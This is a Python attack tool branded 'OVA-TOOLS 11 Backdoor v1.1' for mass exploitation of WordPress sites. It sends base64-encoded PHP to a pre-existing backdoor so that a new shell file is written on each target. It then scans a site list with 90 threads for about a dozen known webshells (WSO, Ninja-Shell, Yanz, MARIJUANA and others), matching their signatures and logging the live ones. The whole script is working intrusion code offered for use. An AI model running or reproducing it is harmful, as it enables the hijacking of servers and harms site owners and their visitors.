import requests
import random
import string
import base64
import sys
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN

banner = '''{}
           
[#] Create By ::

   ______      __       _______ ____   ____  _       _____ 
  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
 | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
 | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
 | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                          OVA-TOOLS  https://t.me/ovacloud                                                                                              
                             OVA-TOOLS 11 Backdoor v1.1

\n'''.format(fr)
print(banner)
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('/')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

class Eval:
    def __init__(self):
        self.headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                        'referer': 'www.google.com'}

        self.shell_content = """<?php echo "Black Bot";?>"""

    def url_domain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        else:
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern, site):
            sitez = re.findall(pattern, site)
            site = sitez[0]
        return site

    def ran(self, length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def ba_blue(self, site):
        try:
            url = "http://" + self.url_domain(site)
            filename = "blk" + self.ran(5) + ".php"
            backdoors = 'echo \'Black Bot\';fwrite(fopen(\'{}\',\'w+\'),\'{}\');'.format(filename, self.shell_content)
            encoded_php = base64.b64encode(backdoors.encode()).decode()
            response = requests.get(url + "/wp-admin/css/colors/blue/blue.php?wall=" + encoded_php, headers=self.headers).content.decode()
            if 'Black Bot' in response:
                print("Target:{} {} Success Vulnerability ".format(url, fg))
                open('bk.txt', 'a').write(url + "/wp-admin/css/colors/blue/" + filename + "\n")
            else:
                print("Target:{} {} Not Vulnerability ".format(url, fr))
        except:
            pass

code_shell = Eval()

def multiblackbot(url):
    try:
        url = 'http://' + code_shell.url_domain(url)
        check = requests.get(url + '/simple.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if '{Ninja-Shell}' in check.content.decode():
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('Ninja-Shell.txt', 'a').write(url + '/simple.php\n')
        else:

            url = 'https://' + code_shell.url_domain(url)
            check = requests.get(url + '/shell20211028.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
            if 'Uname:' in check.content.decode():
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('wso.txt', 'a').write(url + '/shell20211028.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except:
        print(' -| ' + url + ' --> {}[Failed]'.format(fr))

def lastgbac(url):
    try:
        url_https = 'https://' + code_shell.url_domain(url)
        url_http = 'http://' + code_shell.url_domain(url)

        # Check for mar.php
        check = requests.get(url_https + '/wp-content/plugins/yyobang/mar.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('MARIJUANA.txt', 'a').write(url_https + '/wp-content/plugins/yyobang/mar.php\n')
        else:
            print(' -| ' + url_https + ' --> [Failed]')

        # Check for wp-class.php
        check = requests.get(url_http + '/wp-content/plugins/press/wp-class.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if 'WSO 4.2.5' in check.text:
            print(' -| ' + url_http + ' --> [Successfully]')
            open('wso.txt', 'a').write(url_http + '/wp-content/plugins/press/wp-class.php\n')

        # Check for xxl.php
        check = requests.get(url_https + '/xxl.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('xleet.txt', 'a').write(url_https + '/xxl.php\n')

        # Check for fm1.php
        check = requests.get(url_http + '/fm1.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url_http + ' --> [Successfully]')
            open('wso.txt', 'a').write(url_http + '/fm1.php\n')

        # Check for min.php
        check = requests.get(url_https + '/wp-content/themes/finley/min.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('Yanz Webshell!.txt', 'a').write(url_https + '/wp-content/themes/finley/min.php\n')

        # Check for M1.php
        check = requests.get(url_https + '/M1.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Madstore.sk!' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('Madstore.txt', 'a').write(url_https + '/M1.php\n')

        # Check for wp-head.php
        check = requests.get(url_https + '/wp-head.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('wso.txt', 'a').write(url_https + '/wp-head.php\n')

        # Check for class.api.php
        check = requests.get(url_https + '/class.api.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if '%PDF-0-1<form action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"' in check.text:
            print(' -| ' + url_https + ' --> [Successfully]')
            open('class.api.txt', 'a').write(url_https + '/class.api.php\n')

    except Exception as e:
        print(' -| ' + url + ' --> [Failed]:', str(e))


def run_exp(url):
    try:
        code_shell.ba_blue(url)
        multiblackbot(url)
        lastgbac(url)

    except:
        pass

mp = Pool(90)
mp.map(run_exp, target)
mp.close()
mp.join()
